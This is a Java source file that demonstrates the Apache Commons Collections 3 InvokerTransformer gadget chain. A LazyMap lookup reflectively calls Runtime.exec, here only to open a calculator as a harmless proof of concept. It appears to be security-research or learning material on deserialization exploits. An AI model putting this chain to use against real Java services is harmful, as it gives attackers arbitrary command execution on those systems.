package com.trganda.gadget.cc3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;

public class LazyMapExec {
    public static void main(String[] args){
        ChainedTransformer chainedTransformer =
            new ChainedTransformer(
                new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}),
                    new InvokerTransformer(
                        "exec",
                        new Class[] {String.class},
                        new Object[] {"open -a calculator"})
                });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        lazyMap.get("key");
    }
}
